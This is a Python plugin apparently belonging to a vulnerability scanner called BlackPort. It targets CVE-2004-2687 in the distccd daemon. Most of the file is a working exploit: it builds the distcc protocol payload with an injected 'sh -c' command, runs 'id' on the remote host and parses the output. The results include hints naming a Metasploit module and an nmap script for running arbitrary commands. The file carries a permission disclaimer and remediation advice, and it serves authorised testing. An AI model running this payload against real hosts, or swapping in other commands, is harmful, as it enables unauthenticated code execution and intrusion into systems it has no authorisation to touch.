# plugins/distccd_plugin.py
# =====================================================================
# File: plugins/distccd_plugin.py
# Notes:
# - This file is part of the BlackPort project.
# - distccd 3.1 and earlier is vulnerable to CVE-2004-2687.
# - Protocol verified against Nmap NSE script and public PoC.
# - Use only on hosts/networks you own or have explicit permission to test.
# =====================================================================

from .plugin_base import PluginBase
import socket
import re


class DistccdPlugin(PluginBase):
    name = "distccd RCE Check"
    applicable_services = ["distccd", "Unknown"]

    DISTCCD_PORT = 3632

    def run(self, target, port, banner=None):
        if port != self.DISTCCD_PORT:
            return None

        notes  = ["distccd detected on port 3632 — distributed C compiler daemon."]
        risk   = "HIGH"
        exploit_hint = None

        result, cmd_output = self._probe_rce(target)

        if result == "rce_confirmed":
            notes.append(
                "CRITICAL: CVE-2004-2687 CONFIRMED — distccd executed 'id' command. "
                "Unauthenticated remote code execution as the daemon user."
            )
            if cmd_output:
                notes.append(f"id output: {cmd_output.strip()}")
            risk = "CRITICAL"
            exploit_hint = (
                f"Metasploit: use exploit/unix/misc/distcc_exec "
                f"OR nmap -p 3632 {target} --script distcc-cve2004-2687 "
                f"--script-args=\"distcc-cve2004-2687.cmd='id'\""
            )
        elif result == "responding":
            notes.append(
                "distccd responding — CVE-2004-2687 likely exploitable. "
                "Versions <= 3.1 execute arbitrary commands via ARGV injection."
            )
            risk = "HIGH"
            exploit_hint = (
                f"Metasploit: use exploit/unix/misc/distcc_exec "
                f"OR nmap -p 3632 {target} --script distcc-cve2004-2687"
            )

        notes.append(
            "Remediation: Disable distccd if not needed. "
            "If required, restrict with --allow to trusted IPs only."
        )

        return {
            "plugin":       self.name,
            "risk":         risk,
            "notes":        " | ".join(notes),
            "exploit_hint": exploit_hint,
        }

    def _probe_rce(self, target, timeout=8):
        """
        CVE-2004-2687 — exact protocol from Nmap NSE + Metasploit module.

        Protocol version: DIST00000001  (version=1, NOT 0)
        Argument list:    8 args mimicking a real compile command:
                          sh -c '<cmd>' # -c main.c -o main.o
        Source file:      DOTI00000001A  (single byte 'A')
        Output location:  SOUT token in response
        """
        cmd = "id"
        cmd_arg = f"sh -c '({cmd})'"
        cmd_len  = len(cmd_arg)

        # Build the 8-argument payload exactly as Nmap NSE does
        # ARGC00000008
        # ARGV00000002sh
        # ARGV00000002-c
        # ARGV<len><sh -c '(id)'>
        # ARGV00000001#
        # ARGV00000002-c
        # ARGV00000006main.c
        # ARGV00000002-o
        # ARGV00000006main.o
        def av(s):
            if isinstance(s, str):
                s = s.encode()
            return b"ARGV" + f"{len(s):08x}".encode() + s

        payload = (
            b"DIST00000001"
            b"ARGC00000008"
            + av("sh")
            + av("-c")
            + av(cmd_arg)
            + av("#")
            + av("-c")
            + av("main.c")
            + av("-o")
            + av("main.o")
            + b"DOTI00000001A"
        )

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                s.connect((target, self.DISTCCD_PORT))
                s.sendall(payload)

                # Read until DOTO00000000 (end of response) or timeout
                response = b""
                s.settimeout(5)
                try:
                    while True:
                        chunk = s.recv(4096)
                        if not chunk:
                            break
                        response += chunk
                        if b"DOTO00000000" in response:
                            break
                        if len(response) > 16384:
                            break
                except socket.timeout:
                    pass

                resp_str = response.decode(errors="ignore")

                # Output is in SOUT token: SOUT<8hex><data>
                sout_match = re.search(r"SOUT([0-9a-f]{8})(.*)", resp_str, re.DOTALL)
                if sout_match:
                    data_len = int(sout_match.group(1), 16)
                    output   = sout_match.group(2)[:data_len]
                    if output.strip():
                        return "rce_confirmed", output.strip()

                # Fallback: uid= anywhere in response
                if "uid=" in resp_str:
                    uid = re.search(r"(uid=\S+)", resp_str)
                    return "rce_confirmed", uid.group(1) if uid else "uid= confirmed"

                if response:
                    return "responding", None

        except ConnectionRefusedError:
            return None, None
        except Exception:
            pass

        # Bare connectivity check
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(3)
                s.connect((target, self.DISTCCD_PORT))
                return "responding", None
        except Exception:
            pass

        return None, None
